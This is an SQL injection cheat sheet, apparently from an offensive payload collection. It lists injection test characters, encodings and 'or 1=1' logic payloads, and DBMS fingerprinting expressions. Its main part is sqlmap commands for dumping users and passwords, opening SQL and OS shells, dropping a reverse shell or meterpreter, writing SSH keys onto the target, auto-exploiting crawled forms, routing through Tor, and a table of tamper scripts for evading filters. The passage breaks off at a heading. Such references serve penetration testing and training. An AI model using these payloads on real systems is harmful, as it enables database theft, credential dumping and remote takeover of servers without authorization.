<p>A SQL injection attack consists of insertion or &ldquo;injection&rdquo; of a SQL query via the input data from the client to the application.</p>
</blockquote>
<p>Attempting to manipulate SQL queries may have goals including:</p>
<ul>
<li>Information Leakage</li>
<li>Disclosure of stored data</li>
<li>Manipulation of stored data</li>
<li>Bypassing authorization controls</li>
</ul>
<h2 id="entry-point-detection">
  Entry point detection
  <a class="anchor" href="#entry-point-detection">#</a>
</h2>
<p>Detection of an SQL injection entry point
Simple characters</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">%27
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">%22
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">#
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">%23
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">%3B
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Wildcard (*)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&amp;apos;  # required for XML content
</span></span></span></code></pre></div><p>Multiple encoding</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">%%</span><span style="color:#ae81ff">2727</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#ae81ff">25</span><span style="color:#f92672">%</span><span style="color:#ae81ff">27</span>
</span></span></code></pre></div><p>Merging characters</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">`+</span>HERP
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;||&#39;</span>DERP
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;+&#39;</span>herp
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39; &#39;</span>DERP
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;%20&#39;</span>HERP
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;%2B&#39;</span>HERP
</span></span></code></pre></div><p>Logic Testing</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>page.asp<span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">or</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#75715e">-- true
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>page.asp<span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; or 1=1 -- true
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">page.asp?id=1&#34; or 1=1 -- true
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">page.asp?id=1 and 1=2 -- false
</span></span></span></code></pre></div><p>Weird characters</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>Unicode character U<span style="color:#f92672">+</span><span style="color:#ae81ff">02</span>BA MODIFIER LETTER DOUBLE PRIME (encoded <span style="color:#66d9ef">as</span> <span style="color:#f92672">%</span>CA<span style="color:#f92672">%</span>BA) was
</span></span><span style="display:flex;"><span>transformed <span style="color:#66d9ef">into</span> U<span style="color:#f92672">+</span><span style="color:#ae81ff">0022</span> QUOTATION MARK (<span style="color:#e6db74">&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">transformed into U+0027 APOSTROPHE (&#39;)
</span></span></span></code></pre></div><h2 id="dbms-identification">
  DBMS Identification
  <a class="anchor" href="#dbms-identification">#</a>
</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;conv(&#39;a&#39;,16,2)=conv(&#39;a&#39;,16,2)&#34;</span>                   ,<span style="color:#e6db74">&#34;MYSQL&#34;</span>],
</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;connection_id()=connection_id()&#34;</span>                 ,<span style="color:#e6db74">&#34;MYSQL&#34;</span>],
</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;crc32(&#39;MySQL&#39;)=crc32(&#39;MySQL&#39;)&#34;</span>                   ,<span style="color:#e6db74">&#34;MYSQL&#34;</span>],
</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)&#34;</span>       ,<span style="color:#e6db74">&#34;MSSQL&#34;</span>],
</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;@@CONNECTIONS&gt;0&#34;</span>                                 ,<span style="color:#e6db74">&#34;MSSQL&#34;</span>],
</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;@@CONNECTIONS=@@CONNECTIONS&#34;</span>                     ,<span style="color:#e6db74">&#34;MSSQL&#34;</span>],
</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;@@CPU_BUSY=@@CPU_BUSY&#34;</span>                           ,<span style="color:#e6db74">&#34;MSSQL&#34;</span>],
</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;USER_ID(1)=USER_ID(1)&#34;</span>                           ,<span style="color:#e6db74">&#34;MSSQL&#34;</span>],
</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;ROWNUM=ROWNUM&#34;</span>                                   ,<span style="color:#e6db74">&#34;ORACLE&#34;</span>],
</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;RAWTOHEX(&#39;AB&#39;)=RAWTOHEX(&#39;AB&#39;)&#34;</span>                   ,<span style="color:#e6db74">&#34;ORACLE&#34;</span>],
</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;LNNVL(0=123)&#34;</span>                                    ,<span style="color:#e6db74">&#34;ORACLE&#34;</span>],
</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;5::int=5&#34;</span>                                        ,<span style="color:#e6db74">&#34;POSTGRESQL&#34;</span>],
</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;5::integer=5&#34;</span>                                    ,<span style="color:#e6db74">&#34;POSTGRESQL&#34;</span>],
</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;pg_client_encoding()=pg_client_encoding()&#34;</span>       ,<span style="color:#e6db74">&#34;POSTGRESQL&#34;</span>],
</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;get_current_ts_config()=get_current_ts_config()&#34;</span> ,<span style="color:#e6db74">&#34;POSTGRESQL&#34;</span>],
</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;quote_literal(42.5)=quote_literal(42.5)&#34;</span>         ,<span style="color:#e6db74">&#34;POSTGRESQL&#34;</span>],
</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;current_database()=current_database()&#34;</span>           ,<span style="color:#e6db74">&#34;POSTGRESQL&#34;</span>],
</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;sqlite_version()=sqlite_version()&#34;</span>               ,<span style="color:#e6db74">&#34;SQLITE&#34;</span>],
</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;last_insert_rowid()&gt;1&#34;</span>                           ,<span style="color:#e6db74">&#34;SQLITE&#34;</span>],
</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;last_insert_rowid()=last_insert_rowid()&#34;</span>         ,<span style="color:#e6db74">&#34;SQLITE&#34;</span>],
</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;val(cvar(1))=1&#34;</span>                                  ,<span style="color:#e6db74">&#34;MSACCESS&#34;</span>],
</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;IIF(ATN(2)&gt;0,1,0) BETWEEN 2 AND 0&#34;</span>               ,<span style="color:#e6db74">&#34;MSACCESS&#34;</span>],
</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;cdbl(1)=cdbl(1)&#34;</span>                                 ,<span style="color:#e6db74">&#34;MSACCESS&#34;</span>],
</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;1337=1337&#34;</span>,   <span style="color:#e6db74">&#34;MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL&#34;</span>],
</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;&#39;i&#39;=&#39;i&#39;&#34;</span>,     <span style="color:#e6db74">&#34;MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL&#34;</span>],
</span></span></code></pre></div><h2 id="sql-injection-using-sqlmap">
  SQL injection using SQLmap
  <a class="anchor" href="#sql-injection-using-sqlmap">#</a>
</h2>
<h3 id="basic-arguments-for-sqlmap">
  Basic arguments for SQLmap
  <a class="anchor" href="#basic-arguments-for-sqlmap">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap --url<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;url&gt;&#34;</span> -p username --user-agent<span style="color:#f92672">=</span>SQLMAP --random-agent --threads<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span> --risk<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> --level<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> --eta --dbms<span style="color:#f92672">=</span>MySQL --os<span style="color:#f92672">=</span>Linux --banner --is-dba --users --passwords --current-user --dbs
</span></span></code></pre></div><h3 id="load-a-request-file-and-use-mobile-user-agent">
  Load a request file and use mobile user-agent
  <a class="anchor" href="#load-a-request-file-and-use-mobile-user-agent">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -r sqli.req --safe-url<span style="color:#f92672">=</span>http://10.10.10.10/ --mobile --safe-freq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
</span></span></code></pre></div><h3 id="custom-injection-in-useragentheaderreferercookie">
  Custom injection in UserAgent/Header/Referer/Cookie
  <a class="anchor" href="#custom-injection-in-useragentheaderreferercookie">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python sqlmap.py -u <span style="color:#e6db74">&#34;http://example.com&#34;</span> --data <span style="color:#e6db74">&#34;username=admin&amp;password=pass&#34;</span>  --headers<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;x-forwarded-for:127.0.0.1*&#34;</span>
</span></span><span style="display:flex;"><span>The injection is located at the <span style="color:#e6db74">&#39;*&#39;</span>
</span></span></code></pre></div><h3 id="second-order-injection">
  Second order injection
  <a class="anchor" href="#second-order-injection">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order <span style="color:#e6db74">&#34;http://targetapp/wishlist&#34;</span> -v <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>sqlmap -r 1.txt -dbms MySQL -second-order <span style="color:#e6db74">&#34;http://&lt;IP/domain&gt;/joomla/administrator/index.php&#34;</span> -D <span style="color:#e6db74">&#34;joomla&#34;</span> -dbs
</span></span></code></pre></div><h3 id="shell">
  Shell
  <a class="anchor" href="#shell">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>SQL Shell
</span></span><span style="display:flex;"><span>python sqlmap.py -u <span style="color:#e6db74">&#34;http://example.com/?id=1&#34;</span>  -p id --sql-shell
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Simple Shell
</span></span><span style="display:flex;"><span>python sqlmap.py -u <span style="color:#e6db74">&#34;http://example.com/?id=1&#34;</span>  -p id --os-shell
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Dropping a reverse-shell / meterpreter
</span></span><span style="display:flex;"><span>python sqlmap.py -u <span style="color:#e6db74">&#34;http://example.com/?id=1&#34;</span>  -p id --os-pwn
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>SSH Shell by dropping an SSH key
</span></span><span style="display:flex;"><span>python sqlmap.py -u <span style="color:#e6db74">&#34;http://example.com/?id=1&#34;</span> -p id --file-write<span style="color:#f92672">=</span>/root/.ssh/id_rsa.pub --file-destination<span style="color:#f92672">=</span>/home/user/.ssh/
</span></span></code></pre></div><h3 id="crawl-a-website-with-sqlmap-and-auto-exploit">
  Crawl a website with SQLmap and auto-exploit
  <a class="anchor" href="#crawl-a-website-with-sqlmap-and-auto-exploit">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://example.com/&#34;</span> --crawl<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> --random-agent --batch --forms --threads<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> --level<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> --risk<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>--batch <span style="color:#f92672">=</span> non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
</span></span><span style="display:flex;"><span>--crawl <span style="color:#f92672">=</span> how deep you want to crawl a site
</span></span><span style="display:flex;"><span>--forms <span style="color:#f92672">=</span> Parse and test forms
</span></span></code></pre></div><h3 id="using-tor-with-sqlmap">
  Using TOR with SQLmap
  <a class="anchor" href="#using-tor-with-sqlmap">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://www.target.com&#34;</span> --tor --tor-type<span style="color:#f92672">=</span>SOCKS5 --time-sec <span style="color:#ae81ff">11</span> --check-tor --level<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> --risk<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> --threads<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>
</span></span></code></pre></div><h3 id="using-a-proxy-with-sqlmap">
  Using a proxy with SQLmap
  <a class="anchor" href="#using-a-proxy-with-sqlmap">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://www.target.com&#34;</span> --proxy<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://127.0.0.1:8080&#34;</span>
</span></span></code></pre></div><h3 id="using-chrome-cookie-and-a-proxy">
  Using Chrome cookie and a Proxy
  <a class="anchor" href="#using-chrome-cookie-and-a-proxy">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;https://test.com/index.php?id=99&#34;</span> --load-cookie<span style="color:#f92672">=</span>/media/truecrypt1/TI/cookie.txt --proxy <span style="color:#e6db74">&#34;http://127.0.0.1:8080&#34;</span>  -f  --time-sec <span style="color:#ae81ff">15</span> --level <span style="color:#ae81ff">3</span>
</span></span></code></pre></div><h3 id="using-suffix-to-tamper-the-injection">
  Using suffix to tamper the injection
  <a class="anchor" href="#using-suffix-to-tamper-the-injection">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python sqlmap.py -u <span style="color:#e6db74">&#34;http://example.com/?id=1&#34;</span>  -p id --suffix<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;-- &#34;</span>
</span></span></code></pre></div><h3 id="general-tamper-option-and-tampers-list">
  General tamper option and tamper&rsquo;s list
  <a class="anchor" href="#general-tamper-option-and-tampers-list">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>tamper<span style="color:#f92672">=</span>name_of_the_tamper
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>| Tamper | Description |
</span></span><span style="display:flex;"><span>| ------------- | ------------- |
</span></span><span style="display:flex;"><span>| 0x2char.py | Replaces each <span style="color:#f92672">(</span>MySQL<span style="color:#f92672">)</span> 0x&lt;hex&gt; encoded string with equivalent CONCAT<span style="color:#f92672">(</span>CHAR<span style="color:#f92672">()</span>,…<span style="color:#f92672">)</span> counterpart |
</span></span><span style="display:flex;"><span>| apostrophemask.py | Replaces apostrophe character with its UTF-8 full width counterpart |
</span></span><span style="display:flex;"><span>| apostrophenullencode.py | Replaces apostrophe character with its illegal double unicode counterpart |
</span></span><span style="display:flex;"><span>| appendnullbyte.py | Appends encoded NULL byte character at the end of payload |
</span></span><span style="display:flex;"><span>| base64encode.py | Base64 all characters in a given payload  |
</span></span><span style="display:flex;"><span>| between.py | Replaces greater than operator <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;&gt;&#39;</span><span style="color:#f92672">)</span> with <span style="color:#e6db74">&#39;NOT BETWEEN 0 AND #&#39;</span> |
</span></span><span style="display:flex;"><span>| bluecoat.py | Replaces space character after SQL statement with a valid random blank character.Afterwards replace character <span style="color:#f92672">=</span> with LIKE operator  |
</span></span><span style="display:flex;"><span>| chardoubleencode.py | Double url-encodes all characters in a given payload <span style="color:#f92672">(</span>not processing already encoded<span style="color:#f92672">)</span> |
</span></span><span style="display:flex;"><span>| charencode.py | URL-encodes all characters in a given payload <span style="color:#f92672">(</span>not processing already encoded<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>e.g. SELECT -&gt; %53%45%4C%45%43%54<span style="color:#f92672">)</span> |
</span></span><span style="display:flex;"><span>| charunicodeencode.py | Unicode-URL-encodes all characters in a given payload <span style="color:#f92672">(</span>not processing already encoded<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>e.g. SELECT -&gt; %u0053%u0045%u004C%u0045%u0043%u0054<span style="color:#f92672">)</span> |
</span></span><span style="display:flex;"><span>| charunicodeescape.py | Unicode-escapes non-encoded characters in a given payload <span style="color:#f92672">(</span>not processing already encoded<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>e.g. SELECT -&gt; <span style="color:#ae81ff">\u</span>0053<span style="color:#ae81ff">\u</span>0045<span style="color:#ae81ff">\u</span>004C<span style="color:#ae81ff">\u</span>0045<span style="color:#ae81ff">\u</span>0043<span style="color:#ae81ff">\u</span>0054<span style="color:#f92672">)</span> |
</span></span><span style="display:flex;"><span>| commalesslimit.py | Replaces instances like <span style="color:#e6db74">&#39;LIMIT M, N&#39;</span> with <span style="color:#e6db74">&#39;LIMIT N OFFSET M&#39;</span> |
</span></span><span style="display:flex;"><span>| commalessmid.py | Replaces instances like <span style="color:#e6db74">&#39;MID(A, B, C)&#39;</span> with <span style="color:#e6db74">&#39;MID(A FROM B FOR C)&#39;</span> |
</span></span><span style="display:flex;"><span>| commentbeforeparentheses.py | Prepends <span style="color:#f92672">(</span>inline<span style="color:#f92672">)</span> comment before parentheses <span style="color:#f92672">(</span>e.g. <span style="color:#f92672">(</span> -&gt; /**/<span style="color:#f92672">()</span> |
</span></span><span style="display:flex;"><span>| concat2concatws.py | Replaces instances like <span style="color:#e6db74">&#39;CONCAT(A, B)&#39;</span> with <span style="color:#e6db74">&#39;CONCAT_WS(MID(CHAR(0), 0, 0), A, B)&#39;</span> |
</span></span><span style="display:flex;"><span>| charencode.py | Url-encodes all characters in a given payload <span style="color:#f92672">(</span>not processing already encoded<span style="color:#f92672">)</span>  |
</span></span><span style="display:flex;"><span>| charunicodeencode.py | Unicode-url-encodes non-encoded characters in a given payload <span style="color:#f92672">(</span>not processing already encoded<span style="color:#f92672">)</span>  |
</span></span><span style="display:flex;"><span>| equaltolike.py | Replaces all occurrences of operator equal <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;=&#39;</span><span style="color:#f92672">)</span> with operator <span style="color:#e6db74">&#39;LIKE&#39;</span>  |
</span></span><span style="display:flex;"><span>| escapequotes.py | Slash escape quotes <span style="color:#f92672">(</span><span style="color:#e6db74">&#39; and &#34;) |
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| greatest.py | Replaces greater than operator (&#39;</span>&gt;<span style="color:#e6db74">&#39;) with &#39;</span>GREATEST<span style="color:#e6db74">&#39; counterpart |
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| halfversionedmorekeywords.py | Adds versioned MySQL comment before each keyword  |
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| htmlencode.py | HTML encode (using code points) all non-alphanumeric characters (e.g. ‘ -&gt; &amp;#39;) |
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| ifnull2casewhenisnull.py | Replaces instances like ‘IFNULL(A, B)’ with ‘CASE WHEN ISNULL(A) THEN (B) ELSE (A) END’ counterpart | 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| ifnull2ifisnull.py | Replaces instances like &#39;</span>IFNULL<span style="color:#f92672">(</span>A, B<span style="color:#f92672">)</span><span style="color:#e6db74">&#39; with &#39;</span>IF<span style="color:#f92672">(</span>ISNULL<span style="color:#f92672">(</span>A<span style="color:#f92672">)</span>, B, A<span style="color:#f92672">)</span><span style="color:#e6db74">&#39; |
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| informationschemacomment.py | Add an inline comment (/**/) to the end of all occurrences of (MySQL) “information_schema” identifier |
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| least.py | Replaces greater than operator (‘&gt;’) with ‘LEAST’ counterpart |
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| lowercase.py | Replaces each keyword character with lower case value (e.g. SELECT -&gt; select) |
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| modsecurityversioned.py | Embraces complete query with versioned comment |
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| modsecurityzeroversioned.py | Embraces complete query with zero-versioned comment |
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| multiplespaces.py | Adds multiple spaces around SQL keywords |
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| nonrecursivereplacement.py | Replaces predefined SQL keywords with representations suitable for replacement (e.g. .replace(&#34;SELECT&#34;, &#34;&#34;)) filters|
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| overlongutf8.py | Converts all characters in a given payload (not processing already encoded) |
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| overlongutf8more.py | Converts all characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. SELECT -&gt; %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94) |
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| percentage.py | Adds a percentage sign (&#39;</span>%<span style="color:#e6db74">&#39;) infront of each character  |
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| plus2concat.py | Replaces plus operator (‘+’) with (MsSQL) function CONCAT() counterpart |
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| plus2fnconcat.py | Replaces plus operator (‘+’) with (MsSQL) ODBC function {fn CONCAT()} counterpart |
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| randomcase.py | Replaces each keyword character with random case value |
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| randomcomments.py | Add random comments to SQL keywords |
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| securesphere.py | Appends special crafted string |
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| sp_password.py |  Appends &#39;</span>sp_password<span style="color:#e6db74">&#39; to the end of the payload for automatic obfuscation from DBMS logs |
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| space2comment.py | Replaces space character (&#39;</span> <span style="color:#e6db74">&#39;) with comments |
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| space2dash.py | Replaces space character (&#39;</span> <span style="color:#e6db74">&#39;) with a dash comment (&#39;</span>--<span style="color:#e6db74">&#39;) followed by a random string and a new line (&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;) |
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| space2hash.py | Replaces space character (&#39;</span> <span style="color:#e6db74">&#39;) with a pound character (&#39;</span><span style="color:#75715e">#&#39;) followed by a random string and a new line (&#39;\n&#39;) |</span>
</span></span><span style="display:flex;"><span>| space2morehash.py | Replaces space character <span style="color:#f92672">(</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">)</span> with a pound character <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;#&#39;</span><span style="color:#f92672">)</span> followed by a random string and a new line <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;\n&#39;</span><span style="color:#f92672">)</span> |
</span></span><span style="display:flex;"><span>| space2mssqlblank.py | Replaces space character <span style="color:#f92672">(</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">)</span> with a random blank character from a valid set of alternate characters |
</span></span><span style="display:flex;"><span>| space2mssqlhash.py | Replaces space character <span style="color:#f92672">(</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">)</span> with a pound character <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;#&#39;</span><span style="color:#f92672">)</span> followed by a new line <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;\n&#39;</span><span style="color:#f92672">)</span> |
</span></span><span style="display:flex;"><span>| space2mysqlblank.py | Replaces space character <span style="color:#f92672">(</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">)</span> with a random blank character from a valid set of alternate characters |
</span></span><span style="display:flex;"><span>| space2mysqldash.py | Replaces space character <span style="color:#f92672">(</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">)</span> with a dash comment <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;--&#39;</span><span style="color:#f92672">)</span> followed by a new line <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;\n&#39;</span><span style="color:#f92672">)</span> |
</span></span><span style="display:flex;"><span>| space2plus.py |  Replaces space character <span style="color:#f92672">(</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">)</span> with plus <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;+&#39;</span><span style="color:#f92672">)</span>  |
</span></span><span style="display:flex;"><span>| space2randomblank.py | Replaces space character <span style="color:#f92672">(</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">)</span> with a random blank character from a valid set of alternate characters |
</span></span><span style="display:flex;"><span>| symboliclogical.py | Replaces AND and OR logical operators with their symbolic counterparts <span style="color:#f92672">(&amp;&amp;</span> and <span style="color:#f92672">||)</span> |
</span></span><span style="display:flex;"><span>| unionalltounion.py | Replaces UNION ALL SELECT with UNION SELECT |
</span></span><span style="display:flex;"><span>| unmagicquotes.py | Replaces quote character <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;) with a multi-byte combo %bf%27 together with generic comment at the end (to make it work) |
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| uppercase.py | Replaces each keyword character with upper case value &#39;</span>INSERT<span style="color:#e6db74">&#39;|
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| varnish.py | Append a HTTP header &#39;</span>X-originating-IP<span style="color:#e6db74">&#39; |
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| versionedkeywords.py | Encloses each non-function keyword with versioned MySQL comment |
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| versionedmorekeywords.py | Encloses each keyword with versioned MySQL comment |
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| xforwardedfor.py | Append a fake HTTP header &#39;</span>X-Forwarded-For<span style="color:#960050;background-color:#1e0010">&#39;</span> |
</span></span></code></pre></div><h3 id="sqlmap-without-sql-injection">
  SQLmap without SQL injection
